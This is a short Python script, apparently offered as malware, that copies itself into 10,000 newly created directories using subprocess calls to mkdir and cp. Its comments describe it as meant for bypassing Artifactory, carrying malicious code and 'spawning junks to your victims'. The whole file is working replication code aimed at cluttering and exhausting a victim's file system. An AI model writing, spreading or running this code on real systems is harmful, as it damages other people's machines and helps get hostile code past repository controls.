# Allow us to capture name of the program when exec
from sys import argv
# Run linux commands
import subprocess

script = argv
name = str(script[0])
# self = list
print(name)

# Launch this shit having bypassed Artifactory
# Integrate malicious code in this script
# Spawning junks to your victims
for i in range(0,10000):
    # 
    directoryName = 'copy'+str(i)
    # Execute linux commands
    subprocess.call(['mkdir', directoryName])
    # copy this program itself to many new copies of itself
    subprocess.call(['cp', name, directoryName])

